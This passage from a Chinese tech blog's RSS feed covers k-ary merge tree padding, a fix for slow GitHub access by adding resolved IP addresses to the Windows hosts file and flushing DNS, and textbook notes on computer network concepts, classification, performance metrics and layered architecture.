<li>若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>n</mi><mn>0</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mi>u</mi><mo mathvariant="normal">≠</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(n_{0} - 1) \% (k - 1) = u \ne 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">%</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>，则说明对于这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">n_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 个叶结点，其中有 <code>u</code> 个多余，不能包含在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 叉归并树中。为构造包含所有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">n_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 个初始归并段的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 叉归并树，应在原有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">n_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 个内结点的基础上再增加 <code>1</code> 个内结点。它在归并树中代替了一个叶结点的位置，被代替的叶结点加上刚才多出的 <code>u</code> 个叶结点，即再加上 <code>k - u - 1</code> 个空归并段，就可以建立归并树</li>
</ul>
<p>以上图为例，用 <code>8</code> 个归并段构成 3 叉树，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>n</mi><mn>0</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mo stretchy="false">(</mo><mi>k</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mn>8</mn><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">%</mi><mo stretchy="false">(</mo><mn>3</mn><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(n_{0} - 1) \% (k - 1) = (8 - 1) \% (3 - 1) = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">%</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">%</span><span class="mopen">(</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，说明 <code>7</code> 个归并段刚好可以构成一棵严格 3 叉树（假设把以 <code>5</code> 为根的树视为一个叶子）。为此，将叶子 <code>5</code> 变成一个内结点，再添加 <code>3 - 1 - 1 = 1</code> 个空归并段，就可以构成一棵严格 3 叉树。</p>
]]></content:encoded>
    </item>
    <item>
      <title>加载 GitHub 问题</title>
      <link>https://sankgao.github.io/computers/windows/github_loading.html</link>
      <guid>https://sankgao.github.io/computers/windows/github_loading.html</guid>
      <source url="https://sankgao.github.io/rss.xml">加载 GitHub 问题</source>
      <description>问题 GitHub (https://github.com/) 网页在国内加载慢，而且有时还加载失败; GitHub 无法访问 GitHub 图片加载失败; GitHub 图片加载失败 解决方法 1. DNS 查询 Github 地址 打开网站 站长工具 (https://tool.chinaz.com/dns/) 并选择 DNS 查询，在 A 类型中...</description>
      <category>Computer</category>
      <pubDate>Mon, 09 Oct 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 问题</h2>
<ul>
<li>
<p><a href="https://github.com/" target="_blank" rel="noopener noreferrer">GitHub</a> 网页在国内加载慢，而且有时还加载失败</p>
<figure><figcaption>GitHub 无法访问</figcaption></figure>
</li>
<li>
<p>GitHub 图片加载失败</p>
<figure><figcaption>GitHub 图片加载失败</figcaption></figure>
</li>
</ul>
<h2> 解决方法</h2>
<ol>
<li>
<p><strong>DNS 查询 Github 地址</strong></p>
<p>打开网站 <a href="https://tool.chinaz.com/dns/" target="_blank" rel="noopener noreferrer">站长工具</a> 并选择 <strong>DNS 查询</strong>，在 A 类型中填写 <code>github.com</code>，再点击监测按钮。</p>
</li>
<li>
<p><strong>复制 IP 地址</strong></p>
<p>复制 DNS 解析出来的 IP 地址。如：<code>20.205.243.166</code>。</p>
</li>
<li>
<p><strong>添加到 hosts 文件</strong></p>
<p>将解析的 IP 地址添加到 <code>C:\Windows\System32\drivers\etc</code> 目录下的 <code>hosts</code> 文件中。如：<code>20.205.243.166 github.com</code></p>
<ul>
<li><strong>20.205.243.166</strong>：指 DNS 解析出来的 IP 地址</li>
<li><strong><code>github.com</code></strong>：指域名</li>
</ul>
</li>
<li>
<p><strong>刷新 DNS 解析缓存</strong></p>
<p>在 Windows 中按 <kbd>Win</kbd> + <kbd>R</kbd> 键，在运行中输入 <code>cmd</code> 打开终端控制器。</p>
<figure><figcaption>终端控制器</figcaption></figure>
<p>在终端控制器中输入 <code>ipconfig /flushdns</code> 命令，刷新 DNS 解析缓存。</p>
<figure><figcaption>ipconfig /flushdns</figcaption></figure>
</li>
<li>
<p>在 A 类型中填写 <code>github.githubassets.com</code>，再点击监测按钮</p>
</li>
<li>
<p>复制 DNS 解析出来的 IP 地址。如：<code>185.199.110.154</code></p>
</li>
<li>
<p>将解析的 IP 地址添加到 <code>hosts</code> 文件中。如：<code>185.199.110.154 github.githubassets.com</code></p>
</li>
<li>
<p>刷新 DNS 解析缓存</p>
</li>
</ol>
]]></content:encoded>
    </item>
    <item>
      <title>计算机网络</title>
      <link>https://sankgao.github.io/computers/base/computer_network.html</link>
      <guid>https://sankgao.github.io/computers/base/computer_network.html</guid>
      <source url="https://sankgao.github.io/rss.xml">计算机网络</source>
      <description>计算机网络体系结构 计算机网络概述 计算机网络的概念 计算机网络就是一些互连的、自治的计算机系统的集合。 在计算机网络发展的不同阶段，人们对计算机网络给出了不同的定义，这些定义反映了当时网络技术发展的水平。这些定义可分为以下三类： 1. 广义观点 只要是能实现远程信息处理的系统或能进一步达到资源共享的系统，都是计算机网络。广义的观点定义了一个计算机通信...</description>
      <category>Computer</category>
      <pubDate>Tue, 26 Sep 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 计算机网络体系结构</h2>
<h3> 计算机网络概述</h3>
<h4> 计算机网络的概念</h4>
<p>计算机网络就是一些互连的、自治的计算机系统的集合。</p>
<p>在计算机网络发展的不同阶段，人们对计算机网络给出了不同的定义，这些定义反映了当时网络技术发展的水平。这些定义可分为以下三类：</p>
<ol>
<li>
<p><strong>广义观点</strong></p>
<p>只要是能实现远程信息处理的系统或能进一步达到资源共享的系统，都是计算机网络。广义的观点定义了一个计算机通信网络，它在物理结构上具有计算机网络的维形，但资源共享能力弱，是计算机网络发展的低级阶段。</p>
</li>
<li>
<p><strong>资源共享观点</strong></p>
<p>计算机网络是 “以能够相互共享资源的方式互连起来的自治计算机系统的集合”。该定义包含三层含义：</p>
<ul>
<li>目的——资源共享</li>
<li>组成单元——分布在不同地理位置的多台独立的 “自治计算机”</li>
<li>网络中的计算机必须遵循的统一规则——网络协议。该定义符合目前计算机网络的基本特征</li>
</ul>
</li>
<li>
<p><strong>用户透明性观点</strong></p>
<p>存在一个能为用户自动管理资源的网络操作系统，它能够调用用户所需要的资源，而整个网络就像一个大的计算机系统一样对用户是透明的。用户使用网络就像使用一台单一的超级计算机，无须了解网络的存在、资源的位置信息。用户透明性观点的定义描述了一个分布式系统，它是网络未来发展追求的目标。</p>
</li>
</ol>
<h4> 计算机网络的组成</h4>
<p>从不同的角度，可以将计算机网络的组成分为如下几类：</p>
<ol>
<li>
<p><strong>组成部分</strong></p>
<p><strong>一个完整的计算机网络主要由硬件、软件、协议三大部分组成，缺一不可</strong>。硬件主要由主机（也称端系统）、通信链路（如：双绞线、光纤）、交换设备（如：路由器、交换机等）和通信处理机（如：网卡）等组成。软件主要包括各种实现资源共享的软件和方便用户使用的各种工具软件（如：网络操作系统、邮件收发程序、FTP 程序、聊天程序等）。软件部分多属于应用层。协议是计算机网络的核心，如同交通规则制约汽车驾驶一样，协议规定了网络传输数据时所遵循的规范。</p>
</li>
<li>
<p><strong>工作方式</strong></p>
<p>计算机网络（这里主要指 Internet，即因特网）可分为 <strong>边缘部分</strong> 和 <strong>核心部分</strong>。边缘部分由所有连接到因特网上、供用户直接使用的主机组成，用来进行通信（如：传输数据、音频或视频）和资源共享；核心部分由大量的网络和连接这些网络的路由器组成，它为边缘部分提供连通性和交换服务。</p>
</li>
<li>
<p><strong>功能组成</strong></p>
<p>计算机网络由 <strong>通信子网</strong> 和 <strong>资源子网</strong> 组成。通信子网由各种传输介质、通信设备和相应的网络协议组成，它使网络具有数据传输、交换、控制和存储的能力，实现联网计算机之间的数据通信。资源子网是实现资源共享功能的设备及其软件的集合，向网络用户提供共享其他计算机上的硬件资源、软件资源和数据资源的服务。</p>
</li>
</ol>
<h4> 计算机网络的功能</h4>
<p>计算机网络的功能很多，现今的很多应用都与网络有关。<strong>主要有以下五大功能：</strong></p>
<ol>
<li>
<p><strong>数据通信</strong></p>
<p>它是计算机网络最基本和最重要的功能，<strong>用来实现联网计算机之间各种信息的传输</strong>，并将分散在不同地理位置的计算机联系起来，进行统一的调配、控制和管理。例如：文件传输、电子邮件等应用，离开了计算机网络将无法实现。</p>
</li>
<li>
<p><strong>资源共享</strong></p>
<p>资源共享可以是软件共享、数据共享，也可以是硬件共享。它使计算机网络中的资源互通有无、分工协作，从而 <strong>极大地提高硬件资源、软件资源和数据资源的利用率。</strong></p>
</li>
<li>
<p><strong>分布式处理</strong></p>
<p>当计算机网络中的某个计算机系统负荷过重时，可以将其处理的某个复杂任务分配给网络中的其他计算机系统，从而利用空闲计算机资源以 <strong>提高整个系统的利用率。</strong></p>
</li>
<li>
<p><strong>提高可靠性</strong></p>
<p>计算机网络中的各台计算机可以通过网络互为替代机。</p>
</li>
<li>
<p><strong>负裁均衡</strong></p>
<p>将工作任务均衡地分配给计算机网络中的各台计算机。</p>
</li>
</ol>
<p>除以上几大主要功能外，计算机网络还可以实现电子化办公与服务、远程教育、娱乐等功能，满足了社会的需求，方便了人们学习、工作和生活，具有巨大的经济效益。</p>
<h4> 计算机网络的分类</h4>
<ol>
<li>
<p><strong>按分布范围分类</strong></p>
<ul>
<li><strong>广域网（WAN）</strong>：提供长距离通信，运送主机所发送的数据，其覆盖范围通常是直径为几十千米到几千千米的区域，因而有时也称远程网。广域网是因特网的核心部分。连接广域网的各结点交换机的链路一般都是高速链路，具有较大的通信容量</li>
<li><strong>城域网（MAN）</strong>：城域网的覆盖范围可以跨越几个街区甚至整个城市，覆盖区域的直径范围是 <code>5~50km</code>。城域网大多采用以太网技术，因此有时也常并入局域网的范围讨论</li>
<li><strong>局域网（LAN）</strong>：局域网一般用微机或工作站通过高速线路相连，覆盖范围较小，通常是直径为几十米到几千米的区域。局域网在计算机配置的数量上没有太多的限制，少的可以只有两台，多的可达几百台。传统上，局域网使用广播技术，而广域网使用交换技术</li>
<li><strong>个人区域网（PAN）</strong>：个人区域网是指在个人工作的地方将消费电子设备（如：平板电脑、智能手机等）用无线技术连接起来的网络，也常称为无线个人区域网（WPAN），覆盖区域的直径约为 <code>10m</code></li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>若中央处理器之间的距离非常近（如：仅 <code>1m</code> 的数量级或甚至更小），则一般称为多处理器系统，而不称为计算机网络</p>
</div>
</li>
<li>
<p><strong>按传输技术分类</strong></p>
<ul>
<li>
<p><strong>广播式网络</strong>：所有联网计算机都共享一个公共通信信道。当一台计算机利用共享通信信道发送报文分组时，所有其他的计算机都会 “收听” 到这个分组。接收到该分组的计算机将通过检查目的地址来决定是否接收该分组。局域网基本上都采用广播式通信技术，广域网中的无线、卫星通信网络也采用广播式通信技术。</p>
</li>
<li>
<p><strong>点对点网络</strong>：每条物理线路连接一对计算机。若通信的两台主机之间没有直接连接的线路，则它们之间的分组传输就要通过中间结点进行接收、存储和转发，直至目的结点。</p>
</li>
</ul>
<p>是否采用分组存储转发与路由选择机制是点对点式网络与广播式网络的重要区别，广域网基本都属于点对点网络。</p>
</li>
<li>
<p><strong>按拓扑结构分类</strong></p>
<p>网络拓扑结构是指由网中结点（路由器、主机等）与通信线路（网线）之间的几何关系（如：总线形、环形）表示的网络结构，主要指通信子网的拓扑结构。</p>
<p>按网络的拓扑结构，主要分为总线形、星形、环形和网状网络等。星形、总线形和环形网络多用于局域网，网状网络多用于广域网。</p>
<ul>
<li><strong>总线形网络</strong>：用单根传输线把计算机连接起来。总线形网络的 <strong>优点</strong> 是建网容易、增/减结点方便、节省线路。<strong>缺点</strong> 是重负载时通信效率不高、总线任意一处对故障敏感</li>
<li><strong>星形网络</strong>：每个终端或计算机都以单独的线路与中央设备相连。中央设备早期是计算机，现在一般是交换机或路由器。星形网络 <strong>优点</strong> 是便于集中控制和管理，因为端用户之间的通信必须经过中央设备。<strong>缺点</strong> 是成本高、中央设备对故障敏感</li>
<li><strong>环形网络</strong>：所有计算机接口设备连接成一个环。环形网络最典型的例子是令牌环局域网。环可以是单环，也可以是双环，环中信号是单向传输的</li>
<li><strong>网状网络</strong>：一般情况下，每个结点至少有两条路径与其他结点相连，多用在广域网中。其有规则型和非规则型两种。其 <strong>优点</strong> 是可靠性高，<strong>缺点</strong> 是控制复杂、线路成本高</li>
</ul>
<p>以上四种基本的网络拓扑结构可以互连为更复杂的网络。</p>
</li>
<li>
<p><strong>按使用者分类</strong></p>
<ul>
<li><strong>公用网（Public Network）</strong>：指电信公司出资建造的大型网络。“公用” 的意思是指所有愿意按电信公司的规定交纳费用的人都可以使用这种网络，因此也称公众网</li>
<li><strong>专用网（Private Network）</strong>：指某个部门为满足本单位特殊业务的需要而建造的网络。这种网络不向本单位以外的人提供服务。例如：铁路、电力、军队等部门的专用网</li>
</ul>
</li>
<li>
<p><strong>按交换技术分类</strong></p>
<p>交换技术是指各台主机之间、各通信设备之间或主机与通信设备之间为交换信息所采用的数据格式和交换装置的方式。<strong>按交换技术可将网络分为如下几种：</strong></p>
<ul>
<li><strong>电路交换网络</strong>：在源结点和目的结点之间建立一条专用的通路用于传送数据，包括建立连接、传输数据和断开连接三个阶段。最典型的电路交换网是传统电话网络。该类网络的 <strong>主要特点</strong> 是整个报文的比特流连续地从源点直达终点，好像是在一条管道中传送。<strong>优点</strong> 是数据直接传送、时延小。<strong>缺点</strong> 是线路利用率低、不能充分利用线路容量、不便于进行差错控制</li>
<li><strong>报文交换网络</strong>：用户数据加上源地址、目的地址、校验码等辅助信息，然后封装成报文。整个报文传送到相邻结点，全部存储后，再转发给下一个结点，重复这一过程直到到达目的结点。每个报文可以单独选择到达目的结点的路径。报文交换网络也称 <em>存储-转发网络</em>，<strong>主要特点</strong> 是整个报文先传送到相邻结点，全部存储后查找转发表，转发到下一个结点。<strong>优点</strong> 是可以较为充分地利用线路容量，可以实现不同链路之间不同数据传输速率的转换，可以实现格式转换，可以实现一对多、多对一的访问，可以实现差错控制。<strong>缺点</strong> 是增大了资源开销（如：辅助信息导致处理时间和存储资源的开销），增加了缓冲时延，需要额外的控制机制来保证多个报文的顺序不乱序，缓冲区难以管理（因为报文的大小不确定，接收方在接收到报文之前不能预知报文的大小）</li>
<li><strong>分组交换网络</strong>：也称包交换网络。其原理是，将数据分成较短的固定长度的数据块，在每个数据块中加上目的地址、源地址等辅助信息组成分组（包），以存储-转发方式传输。其 <strong>主要特点</strong> 是单个分组（它只是整个报文的一部分）传送到相邻结点，存储后查找转发表，转发到下一个结点。除具备报文交换网络的优点外，分组交换网络还具有自身的 <strong>优点</strong>：缓冲易于管理；包的平均时延更小，网络占用的平均缓冲区更少；更易于标准化；更适合应用。现在的主流网络基本上都可视为分组交换网络</li>
</ul>
</li>
<li>
<p><strong>按传输介质分类</strong></p>
<p>传输介质可分为有线和无线两大类，因此网络可以分为有线网络和无线网络。有线网络又分为双绞线网络、同轴电缆网络等。无线网络又可分为蓝牙、微波、无线电等类型。</p>
</li>
</ol>
<h4> 计算机网络的标准化工作</h4>
<p>计算机网络的标准化对计算机网络的发展和推广起到了极为重要的作用。</p>
<p>因特网的所有标准都以 RFC（Request For Comments）的形式在因特网上发布，但并非每个 RFC 都是因特网标准，<strong>RFC 要上升为因特网的正式标准需经过以下四个阶段：</strong></p>
<ul>
<li>因特网草案（Internet Draft）。这个阶段还不是 RFC 文档</li>
<li>建议标准（Proposed Standard）。从这个阶段开始就成为 RFC 文档</li>
<li>草案标准（Draft Standard）</li>
<li>因特网标准（Internet Standard）</li>
</ul>
<p>此外，还有试验的 RFC 和提供信息的 RFC。</p>
<p>在国际上，负责制定、实施相关网络标准的标准化组织众多，主要有如下几个：</p>
<ul>
<li><strong>国际标准化组织（ISO）</strong>：其制定的主要网络标准或规范有 OSI 参考模型、HDLC 等</li>
<li><strong>国际电信联盟（ITU）</strong>：其前身为国际电话电报咨询委员会（CCITT），其下属机构 ITU-T 制定了大量有关远程通信的标准</li>
<li><strong>国际电气电子工程师协会（IEEE）</strong>：世界上最大的专业技术团体，由计算机和工程学专业人士组成。IEEE 在通信领域最著名的研究成果是 802 标准</li>
</ul>
<h4> 计算机网络的性能指标</h4>
<p>性能指标从不同方面度量计算机网络的性能。<strong>常用的性能指标如下：</strong></p>
<ol>
<li>
<p><strong>带宽（Bandwidth）</strong></p>
<p>本来表示通信线路允许通过的信号频带范围，单位是赫兹（Hz）。而在计算机网络中，带宽表示网络的通信线路所能传送数据的能力，是数字信道所能传送的 “最高数据传输速率” 的同义语，单位是比特/秒（b/s）。</p>
</li>
<li>
<p><strong>时延（Delay）</strong></p>
<p>指数据（一个报文或分组）从网络（或链路）的一端传送到另一端所需要的总时间，<strong>它由四部分构成</strong>：</p>
<ul>
<li><strong>发送时延</strong>：结点将分组的所有比特推向（传输）链路所需的时间，即从发送分组的第一个比特算起，到该分组的最后一个比特发送完毕所需的时间，因此也称传输时延。<strong>计算公式为</strong>：<em>发送时延 = 分组长度 / 信道宽度</em></li>
<li><strong>传播时延</strong>：电磁波在信道中传播一定的距离需要花费的时间，即一个比特从链路的一端传播到另一端所需的时间。<strong>计算公式为</strong>：<em>传播时延 = 信道长度 / 电磁波在信道上的传播速率</em></li>
<li><strong>处理时延</strong>：数据在交换结点为存储转发而进行的一些必要的处理所花费的时间。例如：分析分组的首部、从分组中提取数据部分、进行差错检验或查找适当的路由等</li>
<li><strong>排队时延</strong>：分组在进入路由器后要先在输入队列中排队等待处理。路由器确定转发端口后，还要在输出队列中排队等待转发，这就产生了排队时延</li>
</ul>
<p>因此，数据在网络中经历的 <strong>总时延就是以上四部分时延之和</strong>：<em>总时延 = 发送时延 + 传播时延 + 处理时延 + 排队时延</em></p>
</li>
<li>
<p><strong>时延带宽积</strong></p>
<p>指发送端发送的第一个比特即将到达终点时，发送端已经发出了多少个比特，因此又称以比特为单位的链路长度，即 <em>时延带宽积 = 传播时延 × 信道带宽。</em></p>
<p>一个代表链路的圆柱形管道，其长度表示链路的传播时延，横截面积表示链路带宽，则时延带宽积表示该管道可以容纳的比特数量。</p>
</li>
<li>
<p><strong>往返时延（Round-Trip Time，RTT）</strong></p>
<p>指从发送端发出一个短分组，到发送端收到来自接收端的确认（接收端收到数据后立即发送确认），总共经历的时延。在互联网中，往返时延还包括各中间结点的处理时延、排队时延及转发数据时的发送时延。</p>
</li>
<li>
<p><strong>吞吐量（Throughput）</strong></p>
<p>指单位时间内通过某个网络（或信道、接口）的数据量。吞吐量受网络带宽或网络额定速率的限制。</p>
</li>
<li>
<p><strong>速率（Speed）</strong></p>
<p>网络中的速率是指连接到计算机网络上的主机在数字信道上传送数据的速率，也称数据传输速率、数据率或比特率，单位为 b/s（比特/秒）（或 bit/s，有时也写为 bps）。数据率较高时，可用 kb/s（k=103）、Mb/s（M=10<sup>6</sup>）或 Gb/s（G=10<sup>9</sup>）表示。</p>
<p>在计算机网络中，通常把最高数据传输速率称为带宽。</p>
</li>
<li>
<p><strong>信道利用率</strong></p>
<p>指出某一信道有百分之多少的时间是有数据通过的，即 <em>信道利用率 = 有数据通过时间 / （有 + 无）数据通过时间。</em></p>
</li>
</ol>
<h3> 计算机网络体系结构与参考模型</h3>
<h4> 计算机网络分层结构</h4>
<p>两个系统中实体间的通信是一个很复杂的过程，为了降低协议设计和调试过程的复杂性，也为了便于对网络进行研究、实现和维护，促进标准化工作，通常对计算机网络的体系结构以分层的方式进行建模。</p>
<p><strong>把计算机网络的各层及其协议的集合称为网络的体系结构（Architecture）</strong>。换言之，计算机网络的体系结构就是这个计算机网络及其所应完成的功能的精确定义，它是计算机网络中的层次、各层的协议及层间接口的集合。需要强调的是，这些功能究竟是用何种硬件或软件完成的，则是一个遵循这种体系结构的实现（Implementation）问题。体系结构是抽象的，而实现是具体的，是真正在运行的计算机硬件和软件。</p>
<p>计算机网络的体系结构通常都具有可分层的特性，它将复杂的大系统分成若干较容易实现的层次。<strong>分层的基本原则如下：</strong></p>
<ul>
<li>每层都实现一种相对独立的功能，降低大系统的复杂度</li>
<li>各层之间界面自然清晰，易于理解，相互交流尽可能少</li>
<li>各层功能的精确定义独立于具体的实现方法，可以采用最合适的技术来实现</li>
<li>保持下层对上层的独立性，上层单向使用下层提供的服务</li>
<li>整个分层结构应能促进标准化工作</li>
</ul>
<p>由于分层后各层之间相对独立，灵活性好，因而分层的体系结构易于更新（替换单个模块），易于调试，易于交流，易于抽象，易于标准化。但层次越多，有些功能在不同层中难免重复出现，产生额外的开销，导致整体运行效率越低。层次越少，就会使每层的协议太复杂。因此，在分层时应考虑层次的清晰程度与运行效率间的折中、层次数量的折中。</p>
<p>依据一定的规则，将分层后的网络从低层到高层依次称为第 1 层、第 2 层 …… 第 n 层，通常还为每层取一个特定的名称，如：第 1 层的名称为物理层。</p>
<p>在计算机网络的分层结构中，第 n 层中的活动元素通常称为第 n 层实体。具体来说，实体指任何可发送或接收信息的硬件或软件进程，通常是一个特定的软件模块。不同机器上的同一层称为对等层，同一层的实体称为对等实体。第 n 层实体实现的服务为第 n + 1 层所利用。在这种情况下，第 n 层称为服务提供者，第 n + 1 层则服务于用户。</p>
<p>每一层还有自己传送的数据单位，其名称、大小、含义也各有不同。</p>
<p>在计算机网络体系结构的各个层次中，每个报文都分为两部分：一是数据部分，即 SDU；二是控制信息部分，即 PCI，它们共同组成 PDU。</p>
<ul>
<li><strong>服务数据单元（SDU）</strong>：为完成用户所要求的功能而应传送的数据。第 n 层的服务数据单元记为 n-SDU</li>
<li><strong>协议控制信息（PCI）</strong>：控制协议操作的信息。第 n 层的协议控制信息记为 n-PCI</li>
<li><strong>协议数据单元（PDU）</strong>：对等层次之间传送的数据单位称为该层的 PDU。第 n 层的协议数据单元记为 n-PDU。在实际的网络中，每层的协议数据单元都有一个通俗的名称，如：物理层的 PDU 称为比特，数据链路层的 PDU 称为帧，网络层的 PDU 称为分组，传输层的 PDU 称为报文段</li>
</ul>
<p>在各层间传输数据时，把从第 n + 1 层收到的 PDU 作为第 n 层的 SDU，加上第 n 层的 PCI，就变成了第 n 层的 PDU，交给第 n - 1 层后作为 SDU 发送，接收方接收时做相反的处理，因此可知 <strong>三者的关系为</strong>：<code>n-SDU + n-PCI = n-PDU = (n - 1) - SDU</code>。</p>
<p>具体地，层次结构的含义包括以下几方面：</p>
<ul>
